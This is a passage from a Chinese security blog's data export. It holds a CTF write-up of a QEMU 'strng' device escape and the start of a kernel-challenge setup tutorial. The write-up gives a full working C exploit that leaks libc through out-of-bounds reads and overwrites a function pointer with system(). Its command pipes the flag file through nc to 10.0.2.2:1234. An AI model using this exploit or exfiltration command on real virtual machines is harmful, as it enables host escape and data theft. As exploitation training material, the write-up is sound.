class=\"keyword\">return</span> *((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)opaque + (addr &gt;&gt; <span class=\"number\">2</span>) + <span class=\"number\">701</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>addr是传入的参数，可以由我们指定。</p>\n<p>这里的逻辑应当是</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">result = opaque-&gt;regs[addr &gt;&gt; <span class=\"number\">2</span>];</span><br></pre></td></tr></table></figure>\n<p>即将addr右移两位，作为regs的索引，返回对应的值。</p>\n<h4><span id=\"strng_mmio_write\">strng_mmio_write</span></h4><p>当<code>size</code>等于4时，将<code>addr</code>右移两位得到寄存器的索引<code>idx</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( size == <span class=\"number\">4</span> &amp;&amp; (addr &amp; <span class=\"number\">3</span>) == <span class=\"number\">0</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  idx = addr &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx == <span class=\"number\">1</span> )<span class=\"comment\">//idx = 1</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(opaque + <span class=\"number\">0x2BE</span>) = (*(opaque + <span class=\"number\">0x180</span>))(opaque, idx, val);<span class=\"comment\">// rand()</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( idx ) </span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( idx == <span class=\"number\">3</span> )<span class=\"comment\">//idx = 3</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      vala = val;</span><br><span class=\"line\">      v5 = (*(opaque + <span class=\"number\">0x181</span>))(opaque + <span class=\"number\">0xAFC</span>);<span class=\"comment\">// rand_r()</span></span><br><span class=\"line\">      LODWORD(val) = vala;</span><br><span class=\"line\">      *(opaque + <span class=\"number\">0x2C0</span>) = v5;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *(opaque + idx + <span class=\"number\">0x2BD</span>) = val; <span class=\"comment\">//idx = others</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    (*(opaque + <span class=\"number\">0x17F</span>))(val); <span class=\"comment\">//idx = 0</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​    由于我们能够控制addr，所以就能利用其下标对<code>regs[]</code>越界写。</p>\n<h4><span id=\"strng_pmio_read\">strng_pmio_read</span></h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> __fastcall <span class=\"title\">strng_pmio_read</span><span class=\"params\">(<span class=\"keyword\">void</span> *opaque, hwaddr addr, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">uint64_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v4; <span class=\"comment\">// edx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size == <span class=\"number\">4</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( addr )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( addr == <span class=\"number\">4</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v4 = *(opaque + <span class=\"number\">700</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (v4 &amp; <span class=\"number\">3</span>) == <span class=\"number\">0</span> )</span><br><span class=\"line\">          <span class=\"keyword\">return</span> *(opaque + (v4 &gt;&gt; <span class=\"number\">2</span>) + <span class=\"number\">701</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> *(opaque + <span class=\"number\">700</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>还是当idx为4时，将addr右移两位作为reg的索引，返回regs的值，当idx为0，则直接返回<code>opaque-&gt;addr</code>。</p>\n<h4><span id=\"strng_pmio_write\">strng_pmio_write</span></h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> __fastcall <span class=\"title\">strng_pmio_write</span><span class=\"params\">(<span class=\"keyword\">void</span> *opaque, hwaddr addr, <span class=\"keyword\">uint64_t</span> val, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v4; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size == <span class=\"number\">4</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( addr )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( addr == <span class=\"number\">4</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v4 = *(opaque + <span class=\"number\">700</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (v4 &amp; <span class=\"number\">3</span>) == <span class=\"number\">0</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v5 = v4 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">1</span> )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            *(opaque + <span class=\"number\">702</span>) = (*(opaque + <span class=\"number\">384</span>))(opaque, <span class=\"number\">4LL</span>, val);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( v5 )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">3</span> )</span><br><span class=\"line\">              *(opaque + <span class=\"number\">704</span>) = (*(opaque + <span class=\"number\">385</span>))(opaque + <span class=\"number\">2812</span>, <span class=\"number\">4LL</span>, val);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">              *(opaque + v5 + <span class=\"number\">701</span>) = val;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            (*(opaque + <span class=\"number\">383</span>))(val);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(opaque + <span class=\"number\">700</span>) = val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>逻辑类似mmio write，但索引regs时，mmio时利用了传入的addr，而pmio则是由<code>opaque-&gt;addr</code>索引，而这个值是可控的（端口地址为0时，直接将传入的<code>val</code>赋值给<code>opaque-&gt;addr</code>）。因此我们可以控制它来完成越界读写。</p>\n<h3><span id=\"利用\">利用</span></h3><p>首先越界读进行leak，再越界写覆盖<code>rand_r</code>地址为<code>system</code>地址。并触发<code>rand_r</code>实现<code>system(&quot;cat /root/flag&quot;)</code>。</p>\n<h4><span id=\"越界读leak\">越界读leak</span></h4><p>当addr为0，传入的val会直接赋值给<code>opaque-&gt;addr</code>。再调用<code>strng_pmio_read</code>，此时<code>regs[val&gt;&gt;2]</code>的值被读取，实现越界读。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;termios.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/io.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAP_SIZE 4096UL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAP_MASK (MAP_SIZE - 1)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> pmio_base = <span class=\"number\">0xc050</span>;  <span class=\"comment\">// adjust this if different on qemu reset</span></span><br><span class=\"line\"><span class=\"keyword\">char</span>* pci_device_name = <span class=\"string\">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  oot@ubuntu:/home/ubuntu# cat /sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource</span></span><br><span class=\"line\"><span class=\"comment\">  0x00000000febf1000 0x00000000febf10ff 0x0000000000040200  // mmio</span></span><br><span class=\"line\"><span class=\"comment\">  0x000000000000c050 0x000000000000c057 0x0000000000040101  // pmio</span></span><br><span class=\"line\"><span class=\"comment\">  0x0000000000000000 0x0000000000000000 0x0000000000000000</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">pmio_write</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> val, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> addr)</span> </span>&#123;</span><br><span class=\"line\">  outl(val, addr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">pmio_arb_write</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> val, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> offset)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> tmp = offset &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( tmp == <span class=\"number\">1</span> || tmp == <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;PMIO write address is a command&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pmio_write(offset, pmio_base);</span><br><span class=\"line\">  pmio_write(val, pmio_base + <span class=\"number\">4</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"title\">pmio_read</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> offset)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (offset == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> inl(pmio_base);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pmio_write(offset, pmio_base);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> inl(pmio_base + <span class=\"number\">4</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">mmio_write</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> val, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> offset)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> fd;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *map_base, *virt_addr;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>((fd = open(pci_device_name, O_RDWR | O_SYNC)) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;open pci device&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  map_base = mmap(<span class=\"number\">0</span>, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MAP_SIZE &amp; ~MAP_MASK);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(map_base == (<span class=\"keyword\">void</span> *) <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;mmap&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  virt_addr = map_base + (offset &amp; MAP_MASK);</span><br><span class=\"line\">  *((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>*) virt_addr) = val;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(munmap(map_base, MAP_SIZE) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;munmap&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    close(fd);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"number\">0</span> != iopl(<span class=\"number\">3</span>)) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;iopl permissions&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span>  _srandom;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span>  libc_base;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span>  _system;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    &gt;&gt;&gt; map(hex, unpack_many(&quot;cat /root/flag | nc 10.0.2.2 1234   &quot;))</span></span><br><span class=\"line\"><span class=\"comment\">    [&#x27;0x20746163&#x27;, &#x27;0x6f6f722f&#x27;, &#x27;0x6c662f74&#x27;, &#x27;0x7c206761&#x27;, </span></span><br><span class=\"line\"><span class=\"comment\">    &#x27;0x20636e20&#x27;, &#x27;0x302e3031&#x27;, &#x27;0x322e322e&#x27;, &#x27;0x33323120&#x27;, &#x27;0x20202034&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">  */</span>  </span><br><span class=\"line\"></span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x6f6f722f</span>, <span class=\"number\">0xc</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x20746163</span>, <span class=\"number\">0x8</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x6c662f74</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x7c206761</span>, <span class=\"number\">0x14</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x20636e20</span>, <span class=\"number\">0x18</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x302e3031</span>, <span class=\"number\">0x1c</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x322e322e</span>, <span class=\"number\">0x20</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x33323120</span>, <span class=\"number\">0x24</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0x20202034</span>, <span class=\"number\">0x28</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  _srandom = pmio_read(<span class=\"number\">0x108</span>);</span><br><span class=\"line\">  _srandom &lt;&lt;= <span class=\"number\">32</span>;</span><br><span class=\"line\">  _srandom |= pmio_read(<span class=\"number\">0x104</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  libc_base = _srandom - <span class=\"number\">0x3a8d0</span>;</span><br><span class=\"line\">  _system = libc_base + <span class=\"number\">0x45390</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;libc_base: %llx\\n&quot;</span>, libc_base);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;_system  : %llx\\n&quot;</span>, _system);</span><br><span class=\"line\"></span><br><span class=\"line\">  pmio_arb_write(_system &amp; <span class=\"number\">0xffffffff</span>, <span class=\"number\">0x114</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// call system ptr</span></span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>, <span class=\"number\">0xc</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"https://xz.aliyun.com/t/7345#toc-7\">https://xz.aliyun.com/t/7345#toc-7</a></p>\n<p><a href=\"https://www.giantbranch.cn/2020/01/02/CTF%20QEMU%20虚拟机逃逸之HITB-GSEC-2017-babyqemu/?__cf_chl_tk=2N1Wwpu_RNim8qdXIfcgsfWC_W.6dehGZSTasT06KOQ-1658843904-0-gaNycGzNB2U\">https://www.giantbranch.cn/2020/01/02/CTF%20QEMU%20虚拟机逃逸之HITB-GSEC-2017-babyqemu/?__cf_chl_tk=2N1Wwpu_RNim8qdXIfcgsfWC_W.6dehGZSTasT06KOQ-1658843904-0-gaNycGzNB2U</a></p>\n<p><a href=\"https://xz.aliyun.com/t/6562\">https://xz.aliyun.com/t/6562</a></p>\n<p><a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/\">https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/</a></p>\n<p><a href=\"https://blog.csdn.net/yongbaoii/article/details/123824044\">https://blog.csdn.net/yongbaoii/article/details/123824044</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/254906#h2-7\">https://www.anquanke.com/post/id/254906#h2-7</a></p>\n<p><a href=\"https://blog.csdn.net/qq_31457355/article/details/117170589\">https://blog.csdn.net/qq_31457355/article/details/117170589</a></p>\n","categories":["Binary_security"],"tags":["qemu"]},{"title":"kernel环境+基础知识","url":"/2022/07/14/kernel_%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-qLytsvnt\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>      \n<h2><span id=\"环境搭建\">环境搭建</span></h2><p>一般来说教程都会要求我们编译一个内核，安装一个busybox以及qemu，但是实际做题需要的环境只有qemu，因为题目会提供一个内核镜像，而busybox也不是必须，但是在这里还是都搭建一下。</p>\n<h3><span id=\"qemu\">qemu</span></h3><p>一般来说elf的话只需要用包管理器下载：<br><code>sudo apt install qemu-system</code></p>\n<p>有特殊需求可以用源码编译。但是暂时就省去这一步了。</p>\n<p>（ps：这里有一个坑，对于macos + pd的组合，你的pd版本如果是普通的家庭版，将不会支持嵌套虚拟化，也就是四舍五入qemu运行不了，要么换vmware要么花钱升级。我这里选择的是vmware，但是vmware最好也要12.2以上（还是针对intel的情况，m系不清楚），不然会出现各种奇怪的问题）</p>\n<h3><span id=\"kernel\">kernel</span></h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.9.8.tar.xz</span><br><span class=\"line\">unxz linux-5.9.8.tar.xz</span><br><span class=\"line\">tar -xf linux-5.9.8.tar</span><br><span class=\"line\"><span class=\"built_in\">cd</span> linux-5.9.8</span><br><span class=\"line\">make menuconfig</span><br></pre></td></tr></table></figure>\n<p>这一步弹出一个图形化窗口，选择</p>\n<p><code>Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Compile the kernel with debug info</code></p>\n<p><code>Kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger</code></p>\n<p>接着<code>make -j3 bzImage</code></p>\n<p>基本没有过多的报错，反正我没有遇到。</p>\n<h3><span id=\"busybox\">busybox</span></h3><p>还是下载源码编译。</p>\n<p>ubuntu 20.04 编译只有一个报错，产生的原因是没有安装<code>glibc-static</code>依赖。可以直接用包管理器安装，然后直接编译。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://busybox.net/downloads/busybox-1.34.1.tar.bz2</span><br><span class=\"line\">tar -jxf busybox-1.34.1.tar.bz2</span><br></pre></td></tr></table></figure>\n<p>勾选<code>Setttings -&gt; Build static binary (no shared libs),</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> busybox-1.34.1</span><br><span class=\"line\">make menuconfig</span><br><span class=\"line\">make -j 8</span><br></pre></td></tr></table></figure>\n<p>安装到这里就差不多了，后面的步骤比较抽象，这里就直接用题目来举例。</p>\n<h2><span id=\"基础知识\">基础知识</span></h2><p>例题还是<code>CISCN2017_babydriver</code>，可以在ctf wiki上对应章节找到原题。</p>\n<p>题目给了我们三个文件，一般来说内核题都会提供这样的三种文件。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%882.39.57.png\" alt=\"截屏2022-07-15 下午2.39.57\"></p>\n<p>总体来说，<code>boot.sh</code>是一个启动内核的脚本，大致是利用qemu启动，然后规定了启动的一些参数。<code>bzImage</code>则是内核本身，<code>rootfs.cpio</code>是运行qemu需要的一些文件系统。我们分别详细地看一看。</p>\n<h3><span id=\"bootsh\">boot.sh</span></h3><p>当环境准备完善以后，直接执行shell脚本就能够启动题目所给的内核镜像。启动成功的话效果大致如下：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%883.20.54.png\" alt=\"截屏2022-07-15 下午3.20.54\"></p>\n<p>可以看到整个脚本主要是指定了八个参数。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">qemu-system-x86_64 </span><br><span class=\"line\">\t-initrd_rootfs.cpio </span><br><span class=\"line\">\t-kernel bzImage</span><br><span class=\"line\">\t-append &#x27;console = ttyS0 root = /dev/ram oops = panic panic = 1&#x27;</span><br><span class=\"line\">\t-enable-kvm </span><br><span class=\"line\">\t-monitor /dev/null </span><br><span class=\"line\">\t-m 64M --nographic  </span><br><span class=\"line\">\t-smp cores=1,threads=1 </span><br><span class=\"line\">\t-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>\n<p>这里分别解释一下。</p>\n<h5><span id=\"ignited\">ignited</span></h5><p>设置内核启动的内存文件系统，也就是指定我们的<code>rootfs.cpio</code> 文件。</p>\n<h5><span id=\"kernel\">kernel</span></h5><p>指定内核镜像文件的路径</p>\n<h5><span id=\"append\">append</span></h5><p>附加选项。<code>console=ttyS0</code>意为在当前终端启动虚拟机。<code>oops = panic panic = 1</code>大致是指设置一下当进程崩的时候的状况<code>root = /dev/ram</code>不清楚具体功能。</p>\n<h5><span id=\"-enable-kvm\">-enable-kvm</span></h5><p>启用KVM？</p>\n<h5><span id=\"-monitor\">-monitor</span></h5><h5><span id=\"-m\">-m</span></h5><p>设置内存大小</p>\n<h5><span id=\"-smp\">-smp</span></h5><p>配置客户机的smp系统。例如设置每个cpu socket上的core数量以及将core上的线程数。</p>\n<h5><span id=\"-cpu\">-cpu</span></h5><p>设置cpu模型。这里的<code>+smep</code>意为禁止cpu处于ring0时执行用户空间代码。</p>\n<h3><span id=\"bzimage\">bzimage</span></h3><p>​        一种主流kernel镜像模式，意为big kernel。</p>\n<h3><span id=\"rootscpio\">roots.cpio</span></h3><p>​        可以先file一下。cpio是一种用来备份的格式，直接用对应命令解压：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%883.58.28.png\" alt=\"截屏2022-07-15 下午3.58.28\"></p>\n<p>​        解压后则是我们运行内核需要的文件系统。</p>\n<p>​        看看init有什么吧。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%883.59.14.png\" alt=\"截屏2022-07-15 下午3.59.14\"></p>\n<p>​        可以看到init也是一个shell脚本。</p>\n<p>​        前三行的 <code>mount</code>用于挂载文件系统，例如<code>mount -t proc none /proc</code>相当于当我们访问<code>/proc</code>文件夹，就意味着我们正在访问proc分区。</p>\n<p>​        接着将flag设置为仅root可读，也就是只要我们是root权限那么就能拿到flag。</p>\n<p>​        其他的步骤比较常规，这里重点关注<code>insmod</code>这一条指令。这条指令的作用是插入模块，依赖的是linux的LKM，即动态可加载内核模块功能，在运行时插入或拔出模块。</p>\n<p>​        这里就是插入 <code>babydriver.ko</code>这个模块。</p>\n<p>​        其他的指令暂时不关注。</p>\n<p>​        这道题的漏洞就出在这个驱动上，在分析这个漏洞驱动前，先来了解一下关于驱动的知识。</p>\n<p>​        简单将驱动理解为基于内核的应用程序不可取，但是实际上这两者是有相同点的。</p>\n<p>​        一个从wiki上copy的驱动代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/init.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/module.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/kernel.h&gt;</span></span></span><br><span class=\"line\">MODULE_LICENSE(<span class=\"string\">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">ko_test_init</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;This is a test ko!\\n&quot;</span>);</span><br><span class=\"line\">    <span 